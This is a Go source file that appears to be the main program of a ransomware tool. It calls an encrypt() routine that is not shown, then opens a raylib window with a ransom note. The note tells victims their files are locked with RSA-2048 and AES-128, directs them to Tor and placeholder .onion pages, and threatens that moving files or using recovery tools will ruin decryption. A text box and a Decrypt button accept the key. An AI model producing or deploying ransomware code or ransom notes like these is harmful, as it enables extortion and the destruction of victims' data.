package main

import (
	gui "github.com/gen2brain/raylib-go/raygui"
	rl "github.com/gen2brain/raylib-go/raylib"
	"golang.design/x/clipboard"
)

func main() {
	rl.SetTraceLogLevel(rl.LogWarning)
	rl.InitWindow(750, 600, "IMPORTANT")

	var(
		textBoxText = ""
		textBoxEditMode bool = false
	)
	key, err := encrypt()
	if err != nil { panic(err) }

	rl.SetTargetFPS(60)

	for !rl.WindowShouldClose() {
		rl.BeginDrawing()
		rl.ClearBackground(rl.RayWhite)

		rl.DrawText("You Have Been a Victim of [Ransomware name]", 25, 25, 25, rl.DarkGray)
		rl.DrawText("your files are encrypted with RSA-2048 and AES-128 ciphers.", 25, 75, 20, rl.DarkGray)		
		rl.DrawText("You can only decrypt your files with the specific key we have.", 25, 105, 20, rl.DarkGray)		
		rl.DrawText("What to do:", 25, 155, 20, rl.DarkGray)
		rl.DrawText("1. Go to https://www.torproject.org/ and download the Tor Browser", 25, 185, 20, rl.DarkGray)
		rl.DrawText("2. Visit one of these pages:", 25, 215, 20, rl.DarkGray)
		rl.DrawText("[mirror1].onion", 50, 245, 20, rl.DarkGray)
		rl.DrawText("[mirror2].onion", 50, 275, 20, rl.DarkGray)
		rl.DrawText("WARNING!", 25, 325, 25, rl.DarkGray)
		rl.DrawText("1. Renaming, copying, deleting or moving any files could DAMAGE ", 25, 355, 20, rl.DarkGray)
		rl.DrawText("the cipher and decryption will be impossible.", 40, 385, 20, rl.DarkGray)
		rl.DrawText("2. Trying to recover with any software can also break the cipher", 25, 415, 20, rl.DarkGray)
		rl.DrawText("and file recovery will become a problem.", 40, 445, 20, rl.DarkGray)
		rl.DrawText("key: "+key, 40, 485, 20, rl.DarkGray)
				
		gui.SetStyle(gui.DEFAULT, gui.TEXT_SIZE, 20)

		gui.SetStyle(gui.TEXTBOX, gui.TEXT_ALIGNMENT, int64(gui.TEXT_ALIGN_LEFT))
		if gui.TextBox(rl.Rectangle{X: 25, Y: 525, Width: 325, Height: 40}, &textBoxText, 64, textBoxEditMode) {
			textBoxEditMode = !textBoxEditMode
		}

		if textBoxEditMode && (rl.IsKeyDown(rl.KeyLeftControl) || rl.IsKeyDown(rl.KeyRightControl)) && rl.IsKeyPressed(rl.KeyV) {
			textBoxText += string(clipboard.Read(clipboard.FmtText))
		}
		
		gui.SetStyle(gui.BUTTON, gui.TEXT_ALIGNMENT, gui.TEXT_ALIGN_CENTER)
		if gui.Button(rl.Rectangle{X: 370, Y: 525, Width: 150, Height: 40}, gui.IconText(gui.ICON_KEY, "Decrypt")) {
			if err := decrypt(textBoxText); err != nil {
				panic(err)
			}
		}

		rl.EndDrawing()
	}

	rl.CloseWindow()
}
